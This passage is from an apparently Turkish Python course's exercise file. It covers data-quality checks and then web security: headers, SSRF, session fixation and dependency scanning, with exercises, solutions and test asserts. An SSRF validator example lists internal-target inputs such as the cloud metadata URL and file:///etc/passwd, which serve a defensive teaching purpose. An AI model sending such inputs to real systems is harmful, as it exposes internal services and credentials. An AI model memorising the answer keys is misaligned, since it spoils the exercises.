        o: ['Tamlık: zorunlu alan boş bırakılmış', 'Tekillik: aynı müşteri anahtarı iki kez geçiyor', 'Geçerlilik: biçim uygun ama gerçek bir tarih değil', 'Tazelik: kayıt beklenen günden eski kalmış'],
        a: 2,
        why: 'Alan dolu (tamlık tamam) ve biçim YYYY-AA-GG\'ye uyuyor, ama 30 Şubat diye bir gün yok. Geçerlilik yalnız desen değil, değerin anlamlı olmasıdır; bu yüzden tarihleri regex yerine datetime ile ayrıştırarak doğrula.'
      },
      {
        t: 'mc',
        id: 'veri-boru-hatti-y2',
        stage: 'Isınma',
        q: '10.000 satırlık günlük partide 12 satır şemaya uymuyor. Karantina yaklaşımında ne yapılır?',
        o: [
          '12 satır sessizce atılır, kalan 9.988 satır hedef tabloya yüklenir',
          'Tüm parti reddedilir ve ertesi gün kaynaktan yeniden denenir',
          '9.988 satır yüklenir; 12 satır ham hâli ve nedeniyle ayrı tabloya',
          '12 satırdaki hatalı alanlar varsayılan değerlerle doldurulup yüklenir'
        ],
        a: 2,
        why: 'Karantina veri kaybını önler (satırlar ve nedenleri saklanır) ve tek bozuk satırın tüm raporu bekletmesini engeller. Oran bir eşiği aşarsa (ör. %5) parti yine durdurulur. Uydurma varsayılan değerlerle doldurmak sessiz yanlış veri üretir.'
      },
      {
        t: 'predict',
        id: 'veri-boru-hatti-y3',
        stage: 'Kodu oku',
        q: 'Gerçek <code>raw_signups</code> tablosunun profili: bu kod ne yazdırır?',
        o: ['52 40 10', '52 52 10', '40 40 0', '52 40 0'],
        a: 0,
        code: 'import veri\nr = veri.kayitlar("anadolu_market", "raw_signups")\nids = [x["id"] for x in r]\nbos_sehir = sum(1 for x in r if x["city"] is None)\nprint(len(r), len(set(ids)), bos_sehir)\n',
        why: '52 satırın 12\'si tekrar eden id taşıyor (kimi birebir aynı satır, kimi yalnız e-posta harfleri farklı), bu yüzden 40 benzersiz id var. veri.kayitlar boş hücreyi None\'a çevirir; 10 satırda şehir boş.'
      },
      {
        t: 'order',
        id: 'veri-boru-hatti-y4',
        stage: 'Kodu oku',
        q: '<p>YAML veri sözleşmesini okuyup zorunlu ve benzersiz sütunları listeleyen programın satırlarını sırala. Beklenen çıktı:</p><pre class="out">zorunlu: [\'id\', \'email\']\nbenzersiz: [\'id\']</pre>',
        lines: [
          'import yaml',
          'metin = "columns:\\n  - {name: id, required: true, unique: true}\\n  - {name: email, required: true}\\n  - {name: city}\\n"',
          'sozlesme = yaml.safe_load(metin)',
          'sutunlar = sozlesme["columns"]',
          'print("zorunlu:", [s["name"] for s in sutunlar if s.get("required")])',
          'print("benzersiz:", [s["name"] for s in sutunlar if s.get("unique")])'
        ],
        expect: 'zorunlu: [\'id\', \'email\']\nbenzersiz: [\'id\']\n',
        hint: 'Önce metin, sonra yükleme, sonra sütun listesi; yazdırmalar en sonda.',
        why: 'Sözleşme sıradan bir YAML\'dır; safe_load sözlük ve listelere çevirir. Tanımsız anahtarlar için s.get kullanmak (ör. city\'de required yok) KeyError\'u önler ve "yoksa False" anlamına gelir.'
      },
      {
        t: 'code',
        id: 'veri-boru-hatti-y5',
        stage: 'Rehberli',
        diff: 2,
        q: '<p><code>kalite_boyutlari(kayitlar, anahtar, zorunlu)</code> yaz ve <code>raw_signups</code> üzerinde çalıştır. Dönen sözlük:</p><ul><li><code>"tamlik"</code>: <code>zorunlu</code> listesindeki alanların <b>hepsi</b> dolu (None ya da yalnız boşluk değil) olan satırların oranı</li><li><code>"tekillik"</code>: benzersiz <code>anahtar</code> değeri sayısı / satır sayısı</li><li><code>"tutarlilik"</code>: <code>city</code> alanı dolu satırlarda, değerin <code>strip()</code> sonrası tam olarak "İstanbul", "Ankara" ya da "İzmir" yazımına uyma oranı</li></ul><p>Oranları 3 ondalığa yuvarla. Boş listede tüm oranlar 1.0 olsun.</p>',
        guide: [
          'Satır sayısını n olarak al; n == 0 ise üç oran için 1.0 döndür.',
          'Tamlık: all(...) ile her satırda zorunlu alanların dolu olduğunu denetle; doluluk için "x is not None and str(x).strip() != \'\'".',
          'Tekillik: {k[anahtar] for k in kayitlar} kümesinin uzunluğu / n.',
          'Tutarlılık: şehri dolu satırları süz, kanonik yazımlardan birine uyanları say.'
        ],
        example: 'satirlar = [{"a": 1, "b": None}, {"a": 2, "b": "x"}, {"a": 2, "b": " "}]\ndolu = lambda v: v is not None and str(v).strip() != ""\nprint(sum(all(dolu(s[k]) for k in ["a", "b"]) for s in satirlar) / len(satirlar))\n',
        start: 'import veri\n\nKANONIK = {"İstanbul", "Ankara", "İzmir"}\n\ndef kalite_boyutlari(kayitlar, anahtar, zorunlu):\n    n = len(kayitlar)\n    # TODO: boş liste\n    dolu = lambda v: v is not None and str(v).strip() != ""\n    tamlik = 0\n    tekillik = 0\n    tutarlilik = 0\n    # TODO: üç oranı hesapla\n    return {"tamlik": round(tamlik, 3), "tekillik": round(tekillik, 3), "tutarlilik": round(tutarlilik, 3)}\n\nprint(kalite_boyutlari(veri.kayitlar("anadolu_market", "raw_signups"), "id", ["email", "city"]))\n',
        sol: 'import veri\n\nKANONIK = {"İstanbul", "Ankara", "İzmir"}\n\ndef kalite_boyutlari(kayitlar, anahtar, zorunlu):\n    n = len(kayitlar)\n    if n == 0:\n        return {"tamlik": 1.0, "tekillik": 1.0, "tutarlilik": 1.0}\n    dolu = lambda v: v is not None and str(v).strip() != ""\n    tamlik = sum(all(dolu(k.get(a)) for a in zorunlu) for k in kayitlar) / n\n    tekillik = len({k[anahtar] for k in kayitlar}) / n\n    sehirli = [k["city"] for k in kayitlar if dolu(k.get("city"))]\n    tutarlilik = (sum(s.strip() in KANONIK for s in sehirli) / len(sehirli)) if sehirli else 1.0\n    return {"tamlik": round(tamlik, 3), "tekillik": round(tekillik, 3), "tutarlilik": round(tutarlilik, 3)}\n\nprint(kalite_boyutlari(veri.kayitlar("anadolu_market", "raw_signups"), "id", ["email", "city"]))\n',
        tests: 'r = veri.kayitlar("anadolu_market", "raw_signups")\nk = kalite_boyutlari(r, "id", ["email", "city"])\nassert k["tamlik"] == 0.808, f"42/52 satırda e-posta ve şehir dolu: 0.808 beklenir, gelen {k[\'tamlik\']}"\nassert k["tekillik"] == 0.769, f"40 benzersiz id / 52 satır = 0.769, gelen {k[\'tekillik\']}"\nassert k["tutarlilik"] == 0.476, f"Şehri dolu 42 satırın 20\'si kanonik yazımda: 0.476 beklenir, gelen {k[\'tutarlilik\']}"\nassert kalite_boyutlari([], "id", ["email"]) == {"tamlik": 1.0, "tekillik": 1.0, "tutarlilik": 1.0}, "Boş liste 1.0 vermeli"\n',
        hints: [
          'Oranların hepsi "uyan satır / ilgili satır" kalıbındadır.',
          'True değerleri sum ile toplanınca 1 sayılır: sum(kosul for k in kayitlar).',
          'Tutarlılıkta payda yalnız şehri dolu satırlardır, tüm satırlar değil.'
        ],
        why: 'Boyutları ayrı oranlar olarak ölçmek sorunun türünü gösterir: düşük tamlık kaynak formda zorunlu alan eksikliğine, düşük tekillik çift gönderime, düşük tutarlılık serbest metin girişine işaret eder. Her birinin düzeltmesi farklı ekiptedir.'
      },
      {
        t: 'code',
        id: 'veri-boru-hatti-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Pandera benzeri küçük bir şema doğrulayıcı yaz: <code>sema_dogrula(kayit, sema)</code> hata mesajlarının listesini döndürsün. <code>sema</code> sözlüğü alan → kurallar eşlemesidir. Her alanda kuralları şu sırayla dene ve <b>ilk</b> ihlalde o alanı bırak:</p><ol><li><code>zorunlu: True</code> ve değer None ya da yalnız boşluksa → <code>"&lt;alan&gt;: boş"</code> (zorunlu değilse ve boşsa diğer kuralları atla)</li><li><code>tur</code> (<code>"str"</code>, <code>"int"</code>, <code>"sayi"</code>: int ya da float; bool sayılmaz) uymazsa → <code>"&lt;alan&gt;: tür"</code></li><li><code>desen</code>: <code>re.fullmatch</code> uymazsa → <code>"&lt;alan&gt;: desen"</code></li><li><code>kume</code>: değer kümede değilse → <code>"&lt;alan&gt;: küme"</code></li></ol><p>Gerçek veri: <code>kirli_veri.bayi</code> tablosunun ilk iki satırı başlıktır; testler kalan 10 satırı doğrular.</p>',
        start: 'import re\n\ndef sema_dogrula(kayit, sema):\n    pass\n',
        sol: 'import re\n\ndef _tur_uyar(v, tur):\n    if tur == "str":\n        return isinstance(v, str)\n    if tur == "int":\n        return isinstance(v, int) and not isinstance(v, bool)\n    if tur == "sayi":\n        return isinstance(v, (int, float)) and not isinstance(v, bool)\n    return True\n\ndef sema_dogrula(kayit, sema):\n    hatalar = []\n    for alan, k in sema.items():\n        v = kayit.get(alan)\n        if v is None or (isinstance(v, str) and v.strip() == ""):\n            if k.get("zorunlu"):\n                hatalar.append(f"{alan}: boş")\n            continue\n        if "tur" in k and not _tur_uyar(v, k["tur"]):\n            hatalar.append(f"{alan}: tür")\n        elif "desen" in k and not re.fullmatch(k["desen"], str(v)):\n            hatalar.append(f"{alan}: desen")\n        elif "kume" in k and v not in k["kume"]:\n            hatalar.append(f"{alan}: küme")\n    return hatalar\n',
        tests: 'import veri\nSEMA = {"Column1": {"zorunlu": True, "tur": "str"},\n        "Column3": {"zorunlu": True, "desen": r"\\d{2}\\.\\d{2}\\.\\d{4}"},\n        "Column4": {"zorunlu": True, "tur": "sayi"},\n        "Column5": {"kume": {"yeni", "kasa kapalı"}}}\nbayi = veri.kayitlar("kirli_veri", "bayi")[2:]\nsonuc = [sema_dogrula(s, SEMA) for s in bayi]\nassert sonuc[0] == ["Column4: tür"], f"Merkez Bayi tutarı \'1.250,50\' metin; sayı değil: {sonuc[0]}"\nassert sonuc[1] == [], "Kızılay Bayi (980) geçerli"\nassert sonuc[2] == ["Column4: tür"], "Alsancak Bayi tutarı \'-\'"\nassert sonuc[3] == ["Column1: boş", "Column3: boş", "Column4: boş"], f"Boş satır üç zorunlu alanı ihlal eder: {sonuc[3]}"\nassert sonuc[8] == ["Column3: desen", "Column4: tür"], f"Selçuklu Bayi: tarih \'bilinmiyor\', tutar metin: {sonuc[8]}"\nassert sum(1 for h in sonuc if not h) == 2, "10 satırdan yalnız 2\'ü şemaya uyar"\nassert sema_dogrula({"a": True}, {"a": {"tur": "int"}}) == ["a: tür"], "bool int sayılmamalı"\nassert sema_dogrula({"a": "x"}, {"a": {"kume": {"y"}}}) == ["a: küme"], "küme kuralı"\n',
        hints: [
          'Alan başına bir if/elif zinciri kur; ilk ihlal sonrası elif\'ler çalışmaz.',
          'Boşluk kontrolünü en başta yap; zorunlu değilse continue ile diğer kurallara geçme.',
          'isinstance(True, int) True döner; bool\'u ayrıca dışla.'
        ],
        why: 'Şemayı veri olarak tutmak kuralları koddan ayırır: yeni bir sütun kuralı eklemek tek satırlık sözlük değişikliğidir. Dikkat: ikinci Kızılay satırının ham değeri "1.430" (bin dört yüz otuz) ama otomatik tür dönüşümü onu 1.43 yaptı ve şema "sayı" diye geçirdi. Tür doğru, değer yanlış: bu bir doğruluk (accuracy) sorunudur ve yalnız aralık kuralı ya da kaynakla mutabakat yakalar. Gerçek veride ilk ihlalde durmak mesajları sadeleştirir; pandera\'da lazy=True ise tüm ihlalleri toplar.'
      },
      {
        t: 'code',
        id: 'veri-boru-hatti-y7',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Karantina deseni. <code>yukle(conn, kayitlar, dogrula, parti)</code> yaz: <code>temiz(kayit TEXT)</code> ve <code>karantina(parti TEXT, kayit TEXT, nedenler TEXT)</code> tablolarını yoksa oluştursun. Her kayıt için <code>dogrula(kayit)</code> bir hata listesi döndürür; boşsa kayıt JSON olarak <code>temiz</code>\'e, değilse <code>karantina</code>\'ya (nedenler <code>"; "</code> ile birleştirilmiş) yazılsın. JSON\'da Türkçe karakterler korunmalı (<code>ensure_ascii=False</code>). Tüm yazım tek transaction olsun. Fonksiyon <code>(temiz_sayisi, karantina_sayisi)</code> döndürsün.</p>',
        start: 'import json, sqlite3\n\ndef yukle(conn, kayitlar, dogrula, parti):\n    pass\n',
        sol: 'import json, sqlite3\n\ndef yukle(conn, kayitlar, dogrula, parti):\n    t = k = 0\n    with conn:\n        conn.execute("CREATE TABLE IF NOT EXISTS temiz (kayit TEXT)")\n        conn.execute("CREATE TABLE IF NOT EXISTS karantina (parti TEXT, kayit TEXT, nedenler TEXT)")\n        for kayit in kayitlar:\n            metin = json.dumps(kayit, ensure_ascii=False)\n            hatalar = dogrula(kayit)\n            if hatalar:\n                conn.execute("INSERT INTO karantina VALUES (?, ?, ?)", (parti, metin, "; ".join(hatalar)))\n                k += 1\n            else:\n                conn.execute("INSERT INTO temiz VALUES (?)", (metin,))\n                t += 1\n    return t, k\n',
        tests: 'import veri, re\nr = veri.kayitlar("anadolu_market", "raw_signups")\ndef dogrula(x):\n    h = []\n    if x["city"] is None:\n        h.append("şehir boş")\n    if not re.fullmatch(r"\\d{4}-\\d{2}-\\d{2}", x["signup_date"]):\n        h.append("tarih ISO değil")\n    return h\nc = sqlite3.connect(":memory:")\nassert yukle(c, r, dogrula, "2024-11-01") == (27, 25), "raw_signups: 27 temiz, 25 karantina beklenir"\nornek = c.execute("SELECT nedenler FROM karantina WHERE kayit LIKE \'%ceren%\' LIMIT 1").fetchone()[0]\nassert ornek == "şehir boş; tarih ISO değil", f"İki neden \'; \' ile birleşmeli: {ornek}"\nassert "İ" in "".join(x for (x,) in c.execute("SELECT kayit FROM temiz")), "ensure_ascii=False ile İ korunmalı"\nassert c.execute("SELECT COUNT(DISTINCT parti) FROM karantina").fetchone()[0] == 1, "Parti etiketi yazılmalı"\nassert yukle(c, [], dogrula, "bos") == (0, 0), "Boş partide (0, 0)"\n',
        hints: ['with conn: bloğu commit ya da rollback\'i tek seferde yapar.', 'CREATE TABLE IF NOT EXISTS ikinci çağrıda hata vermez.', 'json.dumps(kayit, ensure_ascii=False) ve "; ".join(hatalar).'],
        why: 'Karantina tablosu kaybı sıfırlar ve hatayı görünür kılar: veri sahibi SELECT nedenler, COUNT(*) ... GROUP BY ile hangi kuralın en çok bozulduğunu görür. Ham kaydı JSON saklamak, şema değişse bile satırı yeniden işlemeyi mümkün kılar.'
      },
      {
        t: 'code',
        id: 'veri-boru-hatti-y8',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>ortak_epostalar(kayitlar)</code>, <b>birden fazla farklı müşteri id\'sinin</b> paylaştığı e-postaları (küçük harfe çevrilmiş ve kırpılmış) sıralı liste olarak döndürmeli. Aynı id\'nin tekrar eden satırları sorun sayılmaz. Gerçek <code>raw_signups</code>\'ta yalnız bir e-posta iki ayrı müşteriye ait; kod ise bambaşka bir liste döndürüyor.</p>',
        start: 'import veri\nfrom collections import Counter\n\ndef ortak_epostalar(kayitlar):\n    sayac = Counter(k["email"] for k in kayitlar)\n    return sorted(e for e, n in sayac.items() if n > 1)\n\nprint(ortak_epostalar(veri.kayitlar("anadolu_market", "raw_signups")))\n',
        sol: 'import veri\nfrom collections import defaultdict\n\ndef ortak_epostalar(kayitlar):\n    idler = defaultdict(set)\n    for k in kayitlar:\n        idler[k["email"].strip().lower()].add(k["id"])\n    return sorted(e for e, s in idler.items() if len(s) > 1)\n\nprint(ortak_epostalar(veri.kayitlar("anadolu_market", "raw_signups")))\n',
        tests: 'r = veri.kayitlar("anadolu_market", "raw_signups")\nassert ortak_epostalar(r) == ["can.kaya@gmail.com"], f"Yalnız can.kaya@gmail.com (id 8 ve 33) beklenir, gelen {ortak_epostalar(r)}"\nassert ortak_epostalar([{"id": 1, "email": "A@x.com "}, {"id": 2, "email": "a@x.com"}]) == ["a@x.com"], "Büyük harf ve boşluk normalleştirilmeli"\nassert ortak_epostalar([{"id": 1, "email": "a@x.com"}, {"id": 1, "email": "a@x.com"}]) == [], "Aynı id\'nin tekrarı ortak e-posta değildir"\n',
        hints: ['İki hata var: normalleştirme yok ve satırlar sayılıyor, id\'ler değil.', 'E-posta → id kümesi eşlemesi kur (defaultdict(set)).', 'Küme boyutu 1\'den büyükse o e-posta birden çok müşteriye aittir.'],
        why: 'Satır saymak, aynı id\'nin çift gönderimini (tekillik sorunu) farklı müşterilerin aynı e-postayı paylaşmasıyla (kimlik eşleştirme sorunu) karıştırır. Normalleştirmeden sayınca da CEREN.YILMAZ@... ile ceren.yilmaz@... ayrı görünür. Doğru soru için doğru anahtarı seçmek kalite işinin yarısıdır.'
      },
      {
        t: 'code',
        id: 'veri-boru-hatti-y9',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>YAML veri sözleşmesini uygulayan raporlayıcı: <code>sozlesme_raporu(yaml_metin, kayitlar)</code>. Sözleşmede <code>columns</code> listesi (<code>name</code>, isteğe bağlı <code>required</code>, <code>unique</code>, <code>pattern</code>, <code>allowed</code>) ve <code>quality.max_karantina_orani</code> var. Kurallar:</p><ul><li>Bir satır, herhangi bir sütunda ihlal varsa karantinaya girer. Boş (None) değer yalnız <code>required</code> ise ihlaldir; boş değere diğer kurallar uygulanmaz.</li><li><code>pattern</code>: <code>re.fullmatch</code> değerin <code>str</code> hâline; <code>allowed</code>: değer listede olmalı.</li><li><code>unique</code>: sütun değeri <b>daha önceki bir satırda görüldüyse</b> bu satır ihlaldir (ilk görülen geçer).</li></ul><p>Dönüş: <code>{"satir": n, "gecerli": g, "karantina": k, "ihlaller": {"&lt;sütun&gt;.&lt;kural&gt;": sayı}, "durum": "GEÇTİ" ya da "KALDI"}</code>. Kural adları: <code>required</code>, <code>unique</code>, <code>pattern</code>, <code>allowed</code>. <code>ihlaller</code> yalnız sıfırdan büyük sayıları içersin. Karantina oranı (k/n) eşiği aşarsa KALDI.</p>',
        start: 'import re, yaml\n\ndef sozlesme_raporu(yaml_metin, kayitlar):\n    pass\n',
        sol: 'import re, yaml\n\ndef sozlesme_raporu(yaml_metin, kayitlar):\n    s = yaml.safe_load(yaml_metin)\n    sutunlar = s["columns"]\n    esik = s.get("quality", {}).get("max_karantina_orani", 0)\n    gorulen = {c["name"]: set() for c in sutunlar if c.get("unique")}\n    ihlaller = {}\n    karantina = 0\n    for k in kayitlar:\n        bozuk = False\n        for c in sutunlar:\n            ad = c["name"]\n            v = k.get(ad)\n            kural = None\n            if v is None:\n                if c.get("required"):\n                    kural = "required"\n            elif c.get("unique") and v in gorulen[ad]:\n                kural = "unique"\n            elif "pattern" in c and not re.fullmatch(c["pattern"], str(v)):\n                kural = "pattern"\n            elif "allowed" in c and v not in c["allowed"]:\n                kural = "allowed"\n            if c.get("unique") and v is not None:\n                gorulen[ad].add(v)\n            if kural:\n                anahtar = f"{ad}.{kural}"\n                ihlaller[anahtar] = ihlaller.get(anahtar, 0) + 1\n                bozuk = True\n        karantina += bozuk\n    n = len(kayitlar)\n    oran = karantina / n if n else 0\n    return {"satir": n, "gecerli": n - karantina, "karantina": karantina,\n            "ihlaller": ihlaller, "durum": "GEÇTİ" if oran <= esik else "KALDI"}\n',
        tests: 'import veri\nr = veri.kayitlar("anadolu_market", "raw_signups")\nS = """\ncolumns:\n  - {name: id, required: true, unique: true}\n  - {name: email, required: true, pattern: "[a-z0-9.]+@[a-z0-9.]+"}\n  - {name: city, required: true, allowed: [İstanbul, Ankara, İzmir]}\n  - {name: signup_date, required: true, pattern: "\\\\\\\\d{4}-\\\\\\\\d{2}-\\\\\\\\d{2}"}\nquality: {max_karantina_orani: 0.05}\n"""\nrap = sozlesme_raporu(S, r)\nassert rap["satir"] == 52, "52 satır"\nassert rap["ihlaller"] == {"email.pattern": 18, "city.required": 10, "signup_date.pattern": 20, "id.unique": 12, "city.allowed": 25}, f"İhlal sayıları yanlış: {rap[\'ihlaller\']}"\nassert rap["karantina"] == 45 and rap["gecerli"] == 7, f"Karantina 45, geçerli 7 olmalı: {rap}"\nassert rap["durum"] == "KALDI", "Oran %5 eşiğini çok aşıyor"\ntemiz = [{"id": 1, "email": "a@b.co", "city": "Ankara", "signup_date": "2024-01-01"}]\nassert sozlesme_raporu(S, temiz) == {"satir": 1, "gecerli": 1, "karantina": 0, "ihlaller": {}, "durum": "GEÇTİ"}, "Temiz veri GEÇTİ vermeli"\n',
        hints: [
          'Sütun başına tek ihlal say: required → unique → pattern → allowed sırasıyla if/elif.',
          'unique için sütun başına bir "görülen" kümesi tut; kontrolden SONRA değeri kümeye ekle.',
          'Satır, sütunlardan herhangi birinde ihlal varsa bir kez karantinaya sayılır (bozuk bayrağı).'
        ],
        why: 'Bu fonksiyon, Great Expectations ya da Soda\'nın yaptığının çekirdeğidir: kurallar YAML\'da, uygulayıcı genel, çıktı makinece okunabilir bir rapor. Raporu her çalıştırmada saklarsan, sözleşme ihlallerinin hangi kaynaktan ve ne zamandan beri geldiğini izleyebilirsin.'
      }
    ],
    faq: [
      {
        q: 'Kalite kontrolleri ETL\'in neresine konur?',
        a: 'Üç yerde: kaynaktan okur okumaz (şema ve biçim: sözleşme ihlali erken yakalanır), dönüşümden sonra (iş kuralları, tekillik) ve yayına almadan önce (hacim, toplam mutabakatı, tazelik). Erken kontrol ucuzdur; geç kontrol ise iş sonucunu korur. İkisi de gerekir.'
      },
      {
        q: 'pandera mı, Great Expectations mı, dbt testleri mi?',
        a: 'pandera Python kodunun içinde DataFrame doğrular ve hafiftir; Great Expectations ve Soda raporlama ve veri dokümantasyonu sunan daha büyük çerçevelerdir; dbt testleri veri ambarındaki SQL modellerini denetler. Ekipte hangi katmanda çalıştığına göre seçilir, çoğu ekip ikisini birlikte kullanır.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'web-guvenlik' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'web-guvenlik',
    min: 30,
    html: `<p>Derste OWASP haritasını, enjeksiyonu, XSS'i ve parola saklamayı gördün; güvenlik başlıklarına ve SSRF'ye yalnız adıyla değindik. Bu bölüm dört konuyu uygulamaya döküyor: tarayıcıya "nasıl davran" diyen <b>güvenlik başlıkları</b>, sunucunu saldırganın vekiline çeviren <b>SSRF</b>, oturum çerezinin çalınmadan ele geçirildiği <b>oturum sabitleme</b> ve bağımlılık taramasının CI'a bağlanması.</p>
<h2>Güvenlik başlıkları</h2>
<p>Her HTTP yanıtına eklenen birkaç başlık, kodda bir hata olsa bile saldırının etkisini sınırlar (derinlemesine savunma).</p>
<div class="tbl-wrap"><table><tr><th>Başlık</th><th>Örnek değer</th><th>Neyi önler?</th></tr>
<tr><td><code>Content-Security-Policy</code></td><td><code>default-src 'self'; script-src 'self'; frame-ancestors 'none'</code></td><td>XSS: yalnız izinli kaynaklardan betik çalışır, satır içi betik engellenir</td></tr>
<tr><td><code>Strict-Transport-Security</code></td><td><code>max-age=31536000; includeSubDomains</code></td><td>HTTPS'ten HTTP'ye düşürme (SSL stripping)</td></tr>
<tr><td><code>X-Frame-Options</code></td><td><code>DENY</code></td><td>Tıklama hırsızlığı (clickjacking): sayfanın başka sitede iframe içinde açılması</td></tr>
<tr><td><code>X-Content-Type-Options</code></td><td><code>nosniff</code></td><td>Tarayıcının dosya türünü tahmin edip metni betik olarak çalıştırması</td></tr>
<tr><td><code>Referrer-Policy</code></td><td><code>strict-origin-when-cross-origin</code></td><td>URL'deki token ve parametrelerin başka sitelere sızması</td></tr>
<tr><td><code>Set-Cookie</code> bayrakları</td><td><code>Secure; HttpOnly; SameSite=Lax</code></td><td>Çerezin HTTP'den gitmesi, JavaScript ile okunması, CSRF</td></tr></table></div>
<pre class="code"># Flask: her yanıta başlık ekleyen kanca
@app.after_request
def guvenlik_basliklari(yanit):
    yanit.headers["Content-Security-Policy"] = "default-src 'self'; frame-ancestors 'none'"
    yanit.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    yanit.headers["X-Content-Type-Options"] = "nosniff"
    yanit.headers["X-Frame-Options"] = "DENY"
    yanit.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return yanit
# Django: SECURE_HSTS_SECONDS, SECURE_CONTENT_TYPE_NOSNIFF, X_FRAME_OPTIONS ayarları; CSP için django-csp</pre>
<p>CSP'yi doğrudan zorlamak eski sayfaları bozabilir; önce <code>Content-Security-Policy-Report-Only</code> ile yalnız raporla, ihlalleri topla, sonra zorla. <code>'unsafe-inline'</code> ve <code>'unsafe-eval'</code> CSP'nin XSS korumasını büyük ölçüde boşa çıkarır. HSTS'i ilk kez açarken <code>max-age</code>'i küçük başlat; tarayıcı bu süre boyunca siteye HTTP ile hiç bağlanmaz.</p>
<h2>SSRF: sunucunu vekil yapmak</h2>
<p>Sunucu tarafı istek sahteciliği (Server-Side Request Forgery), kullanıcının verdiği bir URL'ye sunucunun istek atmasıyla ortaya çıkar: "ürün görselini şu adresten içe aktar", "webhook adresin", "PDF'e çevrilecek sayfa". Saldırgan dış adres yerine <code>http://169.254.169.254/</code> (bulut sağlayıcının meta veri servisi, geçici kimlik bilgileri burada), <code>http://localhost:6379</code> (Redis) ya da <code>http://10.0.0.5/admin</code> gibi yalnız iç ağdan erişilebilen adresleri verir. İstek senin sunucundan çıktığı için güvenlik duvarı onu içeriden sayar.</p>
<pre class="py">import ipaddress, socket
from urllib.parse import urlsplit

def guvenli_mi(url, cozumle=socket.gethostbyname):
    parca = urlsplit(url)
    if parca.scheme not in ("http", "https") or not parca.hostname:
        return False
    try:
        ip = ipaddress.ip_address(cozumle(parca.hostname))
    except (OSError, ValueError):
        return False
    return ip.is_global              # özel, döngü, bağlantı-yerel, ayrılmış adresler False

sahte_dns = {"cdn.anadolu.example": "93.184.216.34", "ic.example": "10.0.0.5"}.get
for u in ["https://cdn.anadolu.example/a.png", "http://169.254.169.254/latest/meta-data/",
          "http://ic.example/admin", "file:///etc/passwd", "http://127.0.0.1:6379/"]:
    print(guvenli_mi(u, lambda h: sahte_dns(h) or h), u)</pre>
<p>Kural listesi: yalnız <code>http/https</code>; adı DNS ile <b>çözüp IP'yi</b> denetle (ad kontrolü yetmez, <code>ic.example</code> iç IP'ye çözülebilir); mümkünse alan adı izin listesi kullan; yönlendirmeleri (redirect) kapat ya da her adımı yeniden denetle; denetlediğin IP'ye bağlan (DNS yeniden bağlama, DNS rebinding saldırısında ad ikinci sorguda başka IP'ye çözülür); yanıt boyutu ve süresi için sınır koy. Bulutta meta veri servisi için IMDSv2 gibi token zorunlu sürümleri aç.</p>
<h2>Oturum sabitleme (session fixation)</h2>
<p>Saldırgan önce siteden kendi oturum kimliğini alır, sonra kurbanın tarayıcısına bu kimliği yerleştirir (URL parametresi, alt alan adından çerez). Kurban giriş yaptığında sunucu <b>aynı kimliği</b> yetkili yapar; saldırgan da elindeki kimlikle kurbanın hesabına girer. Çare basittir: <b>yetki düzeyi değiştiğinde (giriş, yetki yükseltme) oturum kimliğini yenile</b>, eski kimliği geçersiz kıl; çıkışta oturumu sunucu tarafında sil. Django <code>login()</code> bunu kendiliğinden yapar (<code>cycle_key</code>); Flask'ta sunucu taraflı oturumda kimliği elle yenilemen gerekir. Ayrıca oturum kimliğini asla URL'de taşıma ve çerezlerde <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> kullan.</p>
<h2>Bağımlılık taraması CI'da</h2>
<p><code>pip-audit</code> kurulu paketleri bilinen açık veritabanına (PyPI Advisory, OSV) karşı tarar. kalite-ci dersindeki iş akışına bir adım olarak eklenir; açık bulunursa iş kırmızı olur. Dependabot ya da Renovate, güncellemeleri otomatik PR olarak açar.</p>
<pre class="code">- name: Bağımlılık taraması
  run: |
    pip install pip-audit
    pip-audit -r requirements.txt --strict --desc</pre>
<div class="note"><b>Gerçek işte</b>Sızma testi (pentest) raporlarının ilk sayfasında çoğunlukla eksik güvenlik başlıkları ve çerez bayrakları yer alır; bunlar en ucuz düzeltmelerdir. SSRF ise bulut ortamlarında kimlik bilgisi sızıntısına yol açtığı için en pahalı bulgular arasındadır. Kod incelemesinde "kullanıcıdan gelen URL'ye istek atılıyor mu?" sorusu ayrı bir madde olmalı.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'web-guvenlik-y1',
        stage: 'Isınma',
        q: 'Sayfan saldırganın sitesinde görünmez bir <code>iframe</code> içinde açılıp kullanıcıya "Sil" düğmesine tıklatılıyor. Hangi başlık bunu doğrudan engeller?',
        o: [
          '<code>X-Content-Type-Options: nosniff</code> (tür tahmini)',
          '<code>X-Frame-Options: DENY</code>',
          '<code>Referrer-Policy: no-referrer</code> (adres sızıntısı)',
          '<code>Strict-Transport-Security: max-age=31536000</code>'
        ],
        a: 1,
        why: 'Tıklama hırsızlığı (clickjacking) sayfanın başka bir sitede çerçeve içinde gösterilmesine dayanır; X-Frame-Options: DENY ya da CSP frame-ancestors bunu yasaklar. nosniff tür tahminini, Referrer-Policy yönlendiren adres sızıntısını, HSTS ise HTTP\'ye düşürmeyi engeller.'
      },
      {
        t: 'mc',
        id: 'web-guvenlik-y2',
        stage: 'Isınma',
        q: 'Giriş fonksiyonun kullanıcıyı doğruladıktan sonra mevcut oturuma <code>kullanici_id</code> yazıyor, oturum kimliğini değiştirmiyor. Bu hangi saldırıya açıktır?',
        o: ['SQL enjeksiyonu', 'Oturum sabitleme (session fixation)', 'Sunucu tarafı istek sahteciliği (SSRF)', 'Dizin geçişi (path traversal)'],
        a: 1,
        why: 'Saldırgan önceden bildiği bir oturum kimliğini kurbana kabul ettirirse, kurban girişten sonra aynı kimlikle yetkili olur. Girişte kimliği yenilemek (Django\'da cycle_key) saldırganın elindeki kimliği değersiz kılar.'
      },
      {
        t: 'predict',
        id: 'web-guvenlik-y3',
        stage: 'Kodu oku',
        q: 'Bu kod ne yazdırır?',
        o: ['True False False False', 'True False True False', 'True False False True', 'False False False False'],
        a: 0,
